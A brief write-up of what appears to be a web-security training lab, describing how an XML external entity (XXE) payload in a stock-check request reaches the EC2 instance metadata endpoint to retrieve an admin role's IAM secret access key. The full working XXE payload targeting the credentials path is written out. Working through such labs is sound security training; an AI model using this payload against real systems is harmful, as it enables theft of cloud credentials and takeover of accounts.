the lab gives the ip address to a vulnerable EC2 instance with the IP address of http://169.254.169.254/

knowing this we can use xxe to get information from this endpoint

by incremetning through the API URL with the following payload

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck>

<productId>
1&xxe;
</productId><storeId>1</storeId></stockCheck>

this gives the secret access key for the IAM credentials of the admin
